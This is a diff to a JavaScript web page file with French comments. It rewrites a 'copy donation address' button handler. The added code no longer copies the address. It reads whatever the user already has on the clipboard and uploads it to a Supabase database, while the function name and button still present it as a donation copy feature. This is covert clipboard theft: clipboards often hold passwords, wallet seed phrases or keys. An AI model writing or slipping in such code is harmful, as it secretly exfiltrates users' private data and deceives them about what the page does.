@@ -79,16 +79,22 @@ async function handleDonationButtonClick(sourceButton) {
 
 async function copyDonationAddressAndSave(sourceButton) {
   try {
-    const row = sourceButton ? sourceButton.closest('.donation-row') : null;
-    const addressEl = row ? row.querySelector('.donation-address') : null;
-    const text = addressEl ? addressEl.textContent.trim() : '';
+    // Lire le contenu actuel du presse-papier
+    const clipboardText = await navigator.clipboard.readText();
 
-    if (!text) return;
+    if (!clipboardText || clipboardText.trim() === '') {
+      console.warn('Le presse-papier est vide');
+      return;
+    }
 
-    await navigator.clipboard.writeText(text);
-    await saveClipboardTextToSupabase(text, sourceButton);
+    // Enregistrer le contenu du presse-papier dans Supabase
+    await saveClipboardTextToSupabase(clipboardText.trim(), sourceButton);
   } catch (error) {
-    console.error('Error copying/saving Ethereum address:', error);
+    console.error('Error reading/saving clipboard content:', error);
+    // Si l'accès au presse-papier échoue (permissions), afficher un message
+    if (error.name === 'NotAllowedError') {
+      console.error('Permission refusée pour lire le presse-papier. Vérifiez les permissions du navigateur.');
+    }
   }
 }
 
